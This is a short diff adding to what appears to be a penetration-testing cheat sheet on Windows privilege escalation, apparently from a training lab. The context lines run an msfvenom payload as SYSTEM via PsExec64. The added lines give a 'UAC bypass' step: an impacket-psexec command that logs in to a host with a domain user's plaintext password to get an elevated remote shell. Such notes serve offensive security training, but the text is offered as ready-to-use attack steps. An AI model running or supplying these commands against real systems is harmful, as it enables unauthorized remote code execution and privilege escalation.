@@ -37,3 +37,8 @@ reg query HKLM\Software\microsoft\windows\currentversion\policies\system
 # Load your msfvenom payload with system level permissions 
 .\PsExec64.exe -i -accepteula -d -s C:\windows\temp\pwn.exe
 
+- ---] UAC Bypass with impacket-psexec
+
+# Will automatically attempt to elevate using psexec
+impacket-psexec svcorp.com/brett:ThisIsTheUsersPassword15@10.11.1.24
+
